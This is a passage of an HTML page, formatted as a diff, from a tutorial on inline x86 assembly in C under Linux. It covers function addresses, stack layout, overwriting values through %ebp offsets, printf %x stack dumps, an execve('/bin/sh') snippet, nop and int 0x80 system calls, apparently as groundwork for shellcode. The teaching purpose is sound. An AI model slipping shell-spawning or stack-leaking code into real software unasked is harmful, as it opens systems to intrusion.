+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>The only rationale in
+placing the function abc before main is that the compiler reads the entire file
+only once. It is a single pass one, therefore it does not reread the c file.
+Hence, it needs all function names to be created first before they can be used.<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>a1.c<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>int abc(int i , int j)<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>printf(&quot;%d %d\n&quot;,
+i , j);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>main()<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>printf(&quot;%p\n&quot;,abc);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>Outp</span><span
+style='font-family:"Trebuchet MS";color:#000066'>ut<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>0x8048328<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>The name of a function in C represents
+the address of the function. Therefore, the address of abc function when
+displayed shows 0x8048328(on our machine).<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>a1.c<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>int abc(int i , int j)<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>printf(&quot;%d %d\n&quot;,
+i , j);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>main()<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>__asm(&quot;pushl $10<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><span style="mso-spacerun:
+yes">       </span>pushl $20<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><span style="mso-spacerun:
+yes">       </span>call 0x8048328<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><span style="mso-spacerun:
+yes">     </span><span style="mso-spacerun: yes">  </span>addl $8,%esp<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><span style='mso-tab-count:
+1'>            </span>&quot;);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>Output<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>20 10<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>Once we know the address of
+function abc as 0x8048328, we place this value in the eax register. The call
+instruction is then given the address or the function name through this eax
+register. <o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>For the call instruction, the
+value given to it is where it assumes some program resides. Hence, it starts
+treating the bytes at that location as program code and starts executing them.
+Just for your information, it is the job of the compiler/linker to replace
+function names with actual addresses. <o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>a1.c<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>int abc(int i , int j)<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>printf(&quot;%d %d\n&quot;,
+i , j);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>main()<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>__asm(&quot;pushl $10<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><span style="mso-spacerun:
+yes">       </span>pushl $20<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><span style="mso-spacerun:
+yes">       </span>movl $0x8048328,%eax<span style='mso-tab-count:1'>       </span><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><span style="mso-spacerun:
+yes">       </span>call *%eax<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><span style="mso-spacerun:
+yes">       </span>call %eax<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><span style="mso-spacerun:
+yes">       </span>addl $8,%esp<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><span style='mso-tab-count:
+1'>            </span>&quot;);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>Output<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>20 10<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>The call instruction can be
+take a register as an operand. Though it is optional using a * along with it,
+both of them cannot be used together in one program. <o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>a1.c<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>main()<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>int p = 6;<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>int q = 7;<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>printf(&quot;p=%p
+q=%p\n&quot;,&amp;p,&amp;q);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>abc(3,4);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>pqr();<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>int abc(int i , int j)<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>int x = 1;<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>int y = 2;<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>printf(&quot;i=%p
+j=%p\n&quot;,&amp;i,&amp;j);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>printf(&quot;x=%p
+y=%p\n&quot;,&amp;x,&amp;y);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>printf(&quot;abc %x %x %x %x
+%x %x %x\n&quot;);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>int pqr()<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>printf(&quot;pqr %x %x %x %x
+%x %x %x\n&quot;);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>Output<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>p=0xbfffee94 q=0xbfffee90<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>i=0xbfffee80 j=0xbfffee84<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>x=0xbfffee74 y=0xbfffee70<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>abc bfffee74 bfffee70
+42015554 2 1 bfffee98 804836a<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>pqr 1 bfffee98 804836a 3 4
+bfffee98 8048372<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>a1.c<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>main()<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>abc(10,20);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>abc(int i , int j)<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>int p = 100;<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>int q = 200;<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>printf(&quot;i=%p j=%p p=%p
+q=%p\n&quot;,&amp;i,&amp;j,&amp;p,&amp;q);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>__asm(&quot;movl
+$4,-4(%ebp)&quot;);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>__asm(&quot;movl $3,-8(%ebp)&quot;);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>__asm(&quot;movl
+$2,8(%ebp)&quot;);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>__asm(&quot;movl
+$1,12(%ebp)&quot;);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>printf(&quot;p=%d q=%d i=%d
+j=%d\n&quot;,p,q,i,j);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>Output<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>i=0xbffff380 j=0xbffff384
+p=0xbffff374 q=0xbffff370<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>p=4 q=3 i=2 j=1<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>The round brackets stand for
+a * or indirection. The is equivalent to a square bracket [] in the windows
+assembler syntax.<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>a1.c<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>main()<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>char *argv[2] =
+{&quot;/bin/sh&quot;,0};<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>execve(&quot;/bin/sh&quot;,argv,0);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>printf(&quot;Bye\n&quot;);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>To execute a program, we use
+the execve function. The first parameter is the name of the program, in this
+case it is the bourne shell sh.The second is an array of pointers to chars or
+argv and the third argument is an array of pointers to the environment block.
+This function hands over the control to the shell thus ignoring the remaining
+statements in the file. As a result, the last printf does not get executed. As
+always, the exit command at the shell prompt quits out of the shell just
+created.<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>a1.c<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>main()<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>asm(&quot;nop&quot;);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>The nop instruction does
+nothing at all but yet is very useful for us.<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>a1.c<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>main()<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>printf(&quot;Main
+%p\n&quot;,main);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>__asm(&quot;pushl
+$0x8048328&quot;);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>__asm(&quot;ret&quot;);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>//pause<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>main()<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>__asm(&quot;mov
+$29,%eax&quot;);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>__asm(&quot;int
+$0x80&quot;);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>printf(&quot;Bye\n&quot;);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>In the Windows world, code
+is always called from a dll or shared library. In Linux and Unix system calls are
+made.For this purpose, values are put in<span style="mso-spacerun: yes"> 
+</span>registers and an interrupt is generated. For examply, when a key is
+pressed on the keyboard, the keyboard generates interrupt 9.Calling an
+interrupt is demand immediate attention from the microprocessor so that it can
+perform the task.<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>The above programs aims at
+calling interrupt 80h. However, prior to that values have be placed in the
+registers, which in our case is the eax register. These values are predecided
+and inform the OS of the task that needs to be performed. A value of 29
